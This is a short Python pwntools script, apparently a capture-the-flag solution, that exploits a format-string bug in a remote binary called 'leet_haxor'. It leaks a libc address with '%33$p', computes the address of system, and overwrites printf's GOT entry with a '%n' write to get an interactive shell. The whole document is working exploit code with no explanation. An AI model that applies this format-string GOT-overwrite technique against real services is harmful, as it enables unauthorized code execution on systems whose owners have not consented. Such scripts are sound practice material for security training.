from pwn import *

while True:
    try:
        #p = process("./leet_haxor") 
        printf_got = 0x0000000000601030
        p = remote("jh2i.com",50022)
        payload = ""
        payload += "%33$p"
        p.sendline("0")
        p.sendline(payload)
        p.recvuntil("chrs):\n")
        data = p.recvline().strip()
        leak = int(data,16)
        base = leak - 0x21b97
        system = base + 0x000000000004f440
        print "leak: ",hex(leak)
        print "system: ",hex(system)
        print "base: ",hex(base)
        to_write = system & 0xffffffff
        print "to_write: ",hex(to_write)
        #to_write = 0
        if len(hex(to_write)) <= 9:
            print "FOUUUUUUUUUUUUUUUUUUUUUUUND"
            pause()
            payload = ""
            payload += "%" + str(to_write) + "x"
            payload += "%22$n"
            payload += "A"*(32-len(payload))
            payload += p64(printf_got)
            #payload += "B"*8
            p.sendline("0")
            p.sendline(payload)
            p.interactive()
    except:
        pass